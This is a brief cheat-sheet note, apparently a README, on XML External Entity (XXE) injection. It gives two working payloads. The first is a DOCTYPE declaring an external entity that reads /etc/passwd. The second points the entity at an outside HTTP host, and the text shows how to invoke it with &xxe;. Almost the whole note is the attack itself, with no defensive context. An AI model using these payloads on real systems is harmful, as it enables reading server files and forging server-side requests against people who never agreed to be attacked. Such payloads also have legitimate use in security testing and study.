# XML-XXE-Injection



 it is work like this 
 
 1. <!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ] >
 2. and  we call by this   &xxe;
         or 
    <!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://ip/"> ] >
    &xxe;
